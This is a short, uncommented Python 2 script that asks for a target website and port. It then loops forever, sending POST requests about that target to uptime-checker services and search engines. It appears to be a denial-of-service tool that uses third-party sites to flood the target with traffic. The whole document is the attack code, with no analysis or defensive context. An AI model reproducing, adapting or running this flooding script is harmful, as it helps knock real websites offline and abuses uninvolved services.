import socket, httplib, random
headers = {"Content-type": "application/x-www-form-urlencoded",
           "Accept": "text/plain"}
u=raw_input('TARGET:\n(www.example.com)\n>')
p=raw_input('port:\n>')
o=input('options:\n1-http\n2-https\n>')
if o==1:
 h='http://'
elif o==2:
 h='https://'
else:
 print'unknown input!!!'
i=0
c=['http','tcp','udp','dns']
upp=['www.isitdownrightnow.com','currentlydown.com','www.isitdownrightnow.com','ismywebsitedown.com']
en=['www.google.com','www.yahoo.fr','www.bing.com']
ex=['php','txt','html']
si=['inurl:','allinurl:','site:','site:http://']
def ch():
 try:
  conn = httplib.HTTPConnection('check-host.net',80 , timeout=3)
  t=random.choice(c)
  if t=='http':
   a=h+u
  else:
   a=u+':'+p
  conn.request("POST", '/check-'+t, a, headers)
 except socket.error as e:
  print e
def up1(i):
 for upup in upp:
  try:
   conn = httplib.HTTPConnection(upup,80 , timeout=3)
   conn.request("POST", '/', u, headers)
  except socket.error as e:
   print e

def up2(i):
 s=random.choice(si)
 for ue in en:
  try:
   conn = httplib.HTTPConnection(ue, 80, timeout=3)
   conn.request("POST", '/', s+u+' ext:'+random.choice(ex), headers)
   i+=1
   print i
  except socket.error as e:
   print e

def up3():
 try:
  conn = httplib.HTTPConnection('www.uptrends.com', 80, timeout=3)
  conn.request("POST", '/tools/uptime', u, headers)
 except socket.error as e:
  print e


while True:
 ch()
 i+=18
 print i
 up1(i)
 i+=len(upp)
 print i
 up2(i)
 i+=len(en)
 up3()
 i+=38
 print i
